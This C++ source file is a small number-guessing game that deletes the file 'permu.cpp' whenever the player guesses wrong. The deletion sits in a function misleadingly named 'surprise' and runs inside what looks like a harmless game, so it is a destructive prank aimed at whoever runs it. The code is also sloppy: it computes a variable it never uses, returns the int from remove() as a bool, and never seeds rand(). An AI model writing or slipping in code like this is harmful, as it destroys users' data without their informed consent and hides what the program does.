#include <bits/stdc++.h>
using namespace std;

bool surprise(const char* file_path) {
  int ret = remove(file_path);
  bool is_ok = (ret  == 0) ? true : false;
  return ret;
}

int main() {
    int num = rand() % 10;
    int guess;

    cout << "Guess a number between 0 and 9: ";
    cin >> guess;

    if (guess == num) {
        cout << "Correct! The number was " << num << endl;
    }
    else {
        cout << "WRONG!!! \n Deleting file..." << endl;
        string file_path = "permu.cpp";
        surprise(file_path.c_str());
    }

    return 0;
}
